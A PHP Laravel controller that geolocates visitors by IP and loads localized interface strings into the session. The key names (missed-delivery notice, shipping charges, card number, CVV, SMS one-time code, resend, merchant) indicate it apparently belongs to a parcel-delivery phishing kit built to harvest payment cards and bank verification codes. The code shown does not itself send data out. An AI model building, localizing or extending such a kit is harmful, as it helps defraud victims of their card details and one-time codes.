<?php

namespace App\Http\Controllers;
use Illuminate\Support\Str;
use App\Traits\RequestTrait;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use App\Traits\LanguageTrait;

class sessionController extends Controller
{
    use LanguageTrait;
    use RequestTrait;
    public function create(Request $request){
        $randomstr = Str::random(32);
        $request->session()->put("session", $randomstr);
            $ip = $_SERVER['REMOTE_ADDR'];
            $country_code=$this->getipinfos($ip);
            $country_code=$country_code==""?"us":$country_code;
            $url = "https://restcountries.com/v2/alpha/".$country_code;
            $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($curl);
            $response= json_decode($response);
            curl_close($curl);
            $lang = $response->languages[0]->iso639_1;
            if($lang!="de" && $lang!="he" && $lang!="fr" && $lang!="es"){
                $file = Storage::disk('local')->get('lang-fr.txt');

            }
            else{
                
                $file = Storage::disk('local')->get('lang-'.$lang.'.txt');
                
            }

            $file = \explode("\n",$file);
            $request->session()->put("lang-header-help", $file[0]);
            $request->session()->put("lang-header-find", $file[1]);
            $request->session()->put("lang-header-home", $file[2]);
            $request->session()->put("lang-header-ship", $file[3]);
            $request->session()->put("lang-header-track", $file[4]);
            $request->session()->put("lang-header-register", $file[5]);
            $request->session()->put("lang-header-login", $file[6]);
    //index languages
            $request->session()->put("lang-index-attempt", $file[7]);
            $request->session()->put("lang-index-notdeliver", $file[8]);
            $request->session()->put("lang-index-please", $file[9]);
            $request->session()->put("lang-index-receive", $file[10]);
            $request->session()->put("lang-index-date", $file[11]);
            $request->session()->put("lang-index-charges", $file[12]);
            $request->session()->put("lang-index-trackingnum", $file[13]);
            $request->session()->put("lang-index-continue", $file[14]);
            $request->session()->put("lang-index-thisaction", $file[15]);
            \request()->session()->get("lang-payment-onetime");
            
    //payment langues
            $request->session()->put("lang-payment-package", $file[31]);
            $request->session()->put("lang-payment-protection", $file[32]);
            $request->session()->put("lang-payment-box", $file[33]);
            $request->session()->put("lang-payment-exped", $file[34]);
            $request->session()->put("lang-payment-shipcost", $file[35]);
            $request->session()->put("lang-payment-deldate", $file[36]);
            $request->session()->put("lang-payment-delby", $file[37]);
            $request->session()->put("lang-payment-eod", $file[38]);
            $request->session()->put("lang-payment-summary", $file[39]);
            $request->session()->put("lang-payment-status", $file[40]);
            $request->session()->put("lang-payment-issues", $file[41]);
            $request->session()->put("lang-payment-allows", $file[42]);
            $request->session()->put("lang-payment-canalso", $file[43]);
            $request->session()->put("lang-payment-statusnot", $file[44]);
            $request->session()->put("lang-payment-express", $file[45]);
            $request->session()->put("lang-payment-freight", $file[46]);
            $request->session()->put("lang-payment-resid", $file[47]);
            $request->session()->put("lang-payment-emer", $file[48]);
            $request->session()->put("lang-payment-total", $file[49]);
            $request->session()->put("lang-payment-volum", $file[50]);
            $request->session()->put("lang-payment-totalw", $file[51]);
            $request->session()->put("lang-payment-taxw", $file[52]);
            $request->session()->put("lang-payment-address", $file[53]);
            $request->session()->put("lang-payment-firstn", $file[54]);
            $request->session()->put("lang-payment-lastn", $file[55]);
            $request->session()->put("lang-payment-adr1", $file[56]);
            $request->session()->put("lang-payment-adr2", $file[57]);
            $request->session()->put("lang-payment-post", $file[58]);
            $request->session()->put("lang-payment-city", $file[59]);
            $request->session()->put("lang-payment-state", $file[60]);
            $request->session()->put("lang-payment-country", $file[61]);
            $request->session()->put("lang-payment-phone", $file[62]);
            $request->session()->put("lang-payment-continue", $file[63]);
            $request->session()->put("lang-payment-payment", $file[64]);
            $request->session()->put("lang-payment-cc", $file[65]);
            $request->session()->put("lang-payment-exp", $file[66]);
            $request->session()->put("lang-payment-cvv", $file[67]);
            $request->session()->put("lang-payment-click", $file[68]);
            $request->session()->put("lang-payment-general", $file[69]);
            $request->session()->put("lang-payment-confirm", $file[70]);
            $request->session()->put("lang-payment-onetime", $file[71]);
            $request->session()->put("lang-payment-vercode", $file[72]);
            $request->session()->put("lang-payment-enter", $file[73]);
            $request->session()->put("lang-payment-marchand", $file[74]);
            $request->session()->put("lang-payment-amount", $file[75]);
            $request->session()->put("lang-payment-date", $file[76]);
            $request->session()->put("lang-payment-ccsms", $file[77]);
            $request->session()->put("lang-payment-concode", $file[78]);
            $request->session()->put("lang-payment-conpay", $file[79]);
            $request->session()->put("lang-payment-resend", $file[80]);
            $request->session()->put("lang-payment-contacting", $file[81]);
            $request->session()->put("lang-payment-loading", $file[82]);

            //success langues
            $request->session()->put("lang-success-thank", $file[83]);
            $request->session()->put("lang-success-success", $file[84]);
            $request->session()->put("lang-success-confirmed", $file[85]);
            $request->session()->put("lang-success-deliv", $file[86]);
            $request->session()->put("lang-success-return", $file[87]);
            

    //footer languages
            $request->session()->put("lang-footer-cands", $file[16]);
            $request->session()->put("lang-footer-faqs", $file[17]);
            $request->session()->put("lang-footer-contact", $file[18]);
            $request->session()->put("lang-footer-legal", $file[19]);
            $request->session()->put("lang-footer-terms", $file[20]);
            $request->session()->put("lang-footer-privacy", $file[21]);
            $request->session()->put("lang-footer-alerts", $file[22]);
            $request->session()->put("lang-footer-fawa", $file[23]);
            $request->session()->put("lang-footer-fas", $file[24]);
            $request->session()->put("lang-footer-import", $file[25]);
            $request->session()->put("lang-footer-about", $file[26]);
            $request->session()->put("lang-footer-news", $file[27]);
            $request->session()->put("lang-footer-careers", $file[28]);
            $request->session()->put("lang-footer-legalno", $file[29]);
            $request->session()->put("lang-footer-follow", $file[30]);
    
            
            



        return view("first",["session"=>$randomstr]);

    }
    public function get(Request $request){
        $get = $request->session()->get("session");
        dd($get);

    }
}
